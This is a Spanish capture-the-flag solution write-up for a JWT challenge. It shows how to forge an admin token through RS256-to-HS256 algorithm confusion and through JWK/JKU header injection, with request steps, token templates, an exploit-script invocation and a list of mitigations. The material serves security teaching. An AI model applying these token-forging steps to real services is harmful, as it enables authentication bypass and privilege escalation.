# Solución — web-jwt-04 · Forged Crown

**Categoría:** web · **Dificultad:** insane · **Vuln central:** Confusión de algoritmos **RS256 → HS256** (la clave pública RSA se reutiliza como secreto HMAC). Vuln secundaria: **JWK/JKU header injection** (el token elige su propia clave de verificación).

## Resumen

"Royal Console" autentica por JWT (RS256). `POST /api/login` entrega un token de
invitado (`role=guest`). El objetivo es `GET /admin/crown`, que devuelve la flag
solo a un token con privilegios de admin. La clave **pública** del Reino está a
la vista en `/jwks.json` (JWK) y en `/pubkey`. El verificador de tokens, sin
embargo, está roto y permite forjar un token admin sin conocer la clave privada.

## El endpoint objetivo

`/admin/crown` no se contenta con `role=admin`. Exige TRES condiciones a la vez:

1. Firma válida (según el verificador roto).
2. `role == "admin"`.
3. Claim **anidado** `royal.lineage == "true-heir"`.
4. Header `kid` presente.

Cambiar solo `role` no basta: hay que clonar la estructura completa de claims.

## La vulnerabilidad

### Vía 1 (principal) — Confusión de algoritmos RS256 → HS256

El verificador lee el `alg` del **header sin verificar** y lo usa para decidir
cómo validar la firma (error clásico: confiar en el `alg` del propio token):

- `alg=RS256` → valida con la clave **pública** (firma asimétrica normal).
- `alg=HS256` → usa como **secreto HMAC** el *material de la clave pública*:
  el SPKI en DER codificado en base64 (el campo `key` que publica `/pubkey`).

Como ese material es **público y conocido**, el atacante firma un token HS256
con ese mismo string base64-DER y el servidor lo valida como auténtico:

```
secret_HMAC = base64(DER(clave_publica))   <- el campo "key" de /pubkey
token = HS256.sign({role:admin, royal:{lineage:true-heir}, ...}, secret_HMAC)
```

> Nota técnica: PyJWT 2.x rechaza un PEM `-----BEGIN PUBLIC KEY-----` como
> secreto HMAC (mitigación de la confusión clásica). Por eso el material público
> se publica/reutiliza como base64 del DER, que **no** dispara esa protección y
> sigue siendo enteramente público. La confusión de algoritmos sigue intacta.

### Vía 2 (alternativa) — JWK/JKU header injection

Si el header del token trae `jwk` (clave embebida) o `jku` (URL a un JWKS), el
verificador **confía** en esa clave para validar la firma. El atacante genera su
propio par RSA, firma RS256 con su privada y embebe su pública en el header
`jwk`. El server verifica contra la clave del atacante → firma "válida".

## Cadena de explotación (vía 1, paso a paso)

1. **Token de invitado** (para ver la forma de los claims):
   ```
   POST /api/login {"username":"peon"}
   GET  /api/whoami  (Authorization: Bearer <token>)
   -> {"role":"guest","royal":{"lineage":"commoner"}}
   ```
2. **Obtener el material público de la clave**:
   ```
   GET /pubkey  ->  {"format":"spki-der-b64","key":"MIIBIjANBgkq...","pem":"..."}
   ```
3. **Forjar el token admin con HS256** usando `key` como secreto HMAC, clonando
   la estructura completa de claims:
   ```
   header  = {"alg":"HS256","kid":"royal-2024","typ":"JWT"}
   payload = {"iss":"royal-console","sub":"usurper","role":"admin",
              "royal":{"lineage":"true-heir"}, "iat":..., "exp":...}
   secret  = <campo "key" de /pubkey>
   ```
4. **Reclamar la corona**:
   ```
   GET /admin/crown  (Authorization: Bearer <token forjado>)
   -> {"ok":true,"message":"Larga vida al Rey...","flag":"HL4{...}"}
   ```

Exploit automatizado:
```
python solution/exploit.py http://<host>:8080            # vía alg-confusion (default)
python solution/exploit.py http://<host>:8080 --via jwk  # vía jwk header injection
```

## Por qué es INSANE

- No es un bypass de blocklist ni un "cambia role a admin": requiere entender que
  el verificador **confía en el `alg` del token** y **reutiliza la clave pública
  como secreto HMAC**, y reproducir el material EXACTO (base64-DER) de `/pubkey`.
- Hay dos vías de forja conceptualmente distintas (alg-confusion y jwk/jku), cada
  una exige construir el token a bajo nivel.
- El endpoint exige un claim **anidado** (`royal.lineage=true-heir`) además del
  `role`, así que un token admin "a medias" se rechaza (verificado: 403).
- Un HS256 firmado con un secreto cualquiera se rechaza (verificado: 401): la
  forja SOLO funciona con el material público real.

## Mitigaciones (didáctico)

- **No** derivar el algoritmo del header del token. Fijar `algorithms=["RS256"]`
  (una sola familia) y rechazar cualquier otro `alg`.
- **Nunca** usar material de clave pública como secreto HMAC. Claves simétricas y
  asimétricas deben estar separadas por completo.
- **No** confiar en `jwk`/`jku` del token. Resolver la clave por `kid` contra un
  conjunto de claves de confianza del propio servidor; si se usa `jku`, restringir
  a un allow-list de hosts.
- Validar los claims de autorización en el servidor con un esquema estricto.

## Nota anti-cheat

La flag es **dinámica y única por equipo** (HMAC del flag-service,
`ARCHITECTURE §4`), inyectada por env `FLAG` en la instancia del equipo. El
servicio **no se publica al host**: solo es alcanzable por la VPN del equipo en
`172.30.{N}.14:8080`. Compartir la técnica no da puntos: cada equipo forja su
token contra SU consola para SU flag; enviar la flag de otro equipo dispara
`cheat_flag_share` (`/whose-flag`). Los intentos contra `/admin/crown` emiten
eventos SIEM al collector: `privilege_escalation_attempt`/`auth_failure` (warn)
en intentos fallidos y `flag_access` (alert) cuando un token forjado supera los
checks (con `forged_via`: alg-confusion / jwk-header / jku-header).
